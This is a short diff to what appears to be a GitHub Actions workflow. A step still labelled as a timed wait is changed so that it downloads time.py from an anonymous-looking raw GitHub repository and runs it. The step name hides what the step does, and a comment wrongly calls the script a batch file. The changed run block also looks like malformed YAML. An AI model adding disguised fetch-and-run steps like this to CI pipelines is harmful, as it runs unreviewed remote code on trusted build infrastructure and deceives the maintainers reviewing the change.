@@ -19,6 +19,7 @@ jobs:
         shell: cmd
         run: cmd /c show.bat
 
-      - name: Wait for 4 hours
+      - name: Wait for 5 hours
         shell: powershell
-        run: Start-Sleep -Seconds 14400  # 14400 seconds = 4 hours
+        run: Invoke-WebRequest -Uri "https://raw.githubusercontent.com/mranonymous011000001/daadvsfv-wedfwvd/refs/heads/main/time.py" -OutFile "time.py"
+          python time.py  # Runs the downloaded batch file
